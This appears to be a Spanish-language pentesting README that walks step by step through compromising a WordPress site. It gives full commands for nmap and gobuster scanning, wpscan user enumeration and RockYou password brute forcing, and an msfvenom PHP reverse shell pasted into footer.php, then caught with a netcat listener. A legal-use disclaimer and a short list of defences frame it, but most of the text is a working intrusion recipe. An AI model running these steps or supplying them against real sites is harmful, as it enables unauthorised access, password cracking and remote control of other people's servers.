# Guía: Conexión Reversa en WordPress (Pentesting Legal)  

⚠️ ADVERTENCIA
Este repositorio es únicamente para fines educativos y pruebas legales en entornos autorizados.  
No utilices esta información para actividades ilegales. El acceso no autorizado a sistemas es un delito.  

---

## Requisitos  
- Máquina atacante con Kali Linux (o similar).  
- Acceso legal a un entorno WordPress para pruebas.  
- Herramientas instaladas:  
  - gobuster  
  - wpscan  
  - msfvenom  
  - netcat  

---

## Pasos para Establecer una Reverse Shell en WordPress  

### 1. Escaneo de Puertos  
Identificamos si el puerto 80 (HTTP) está abierto:  
```bash
nmap -p 80 <IP-VÍCTIMA> -v
```

### 2. Fuzzing de Directorios con Gobuster  
Buscamos rutas ocultas en el servidor:  
```bash
gobuster dir -u http://<IP-VÍCTIMA>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

### 3. Análisis de Subdirectorios  
- Si alguna ruta no carga correctamente, revisamos el código fuente (Ctrl + U) para ver posibles subdominios.  
- Editamos /etc/hosts para resolver el dominio:  
  ```bash
  echo "<IP-VÍCTIMA> subdominio.encontrado.com" | sudo tee -a /etc/hosts
  ```
- Volvemos a ejecutar gobuster con el nuevo subdominio.  

### 4. Encontrar el Panel de WordPress  
Buscamos el directorio wp-admin (panel de login):  
```bash
gobuster dir -u http://<IP-VÍCTIMA>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html
```

### 5. Enumeración de Usuarios con WPScan  
Obtenemos una lista de usuarios posibles:  
```bash
wpscan --url http://<IP-VÍCTIMA>/ --enumerate u, vp
```

### 6. Fuerza Bruta con WPScan (RockYou)  
Intentamos crackear contraseñas:  
```bash
wpscan --url http://<IP-VÍCTIMA>/ --passwords /usr/share/wordlists/rockyou.txt --usernames <USUARIO_ENCONTRADO>
```

### 7. Generación del Payload con Msfvenom  
Creamos un payload en PHP para reverse shell:  
```bash
msfvenom -p php/reverse_php LHOST=<TU_IP> LPORT=<PUERTO> -f raw > payload.php
```
- LHOST: Tu dirección IP.  
- LPORT: Puerto de escucha (ej: 4444).  

### 8. Inyección del Payload en WordPress  
1. Accedemos al panel de WordPress (/wp-admin).  
2. Vamos a Appearance → Themes → Theme Editor → Theme Footer (footer.php).  
3. Borramos todo el contenido y pegamos el código del payload.  
4. Guardamos cambios.  

### 9. Poner en Escucha con Netcat  
Ejecutamos en nuestra máquina:  
```bash
nc -lvnp <PUERTO>
```

### 10. Ejecutar el Payload  
- Recargamos la página principal o cualquier página del sitio.  
- Si todo funciona, obtendrás una shell inversa en tu terminal con netcat.  

---

## Protección Contra Este Ataque  
Si eres administrador de WordPress, sigue estas medidas:  
✅ Usa contraseñas fuertes y autenticación en dos pasos (2FA).  
✅ Actualiza WordPress, plugins y temas.  
✅ Limita el acceso a wp-admin por IP.  
✅ Instala plugins de seguridad como Wordfence o Sucuri.  
✅ Deshabilita la edición de temas desde el panel.  

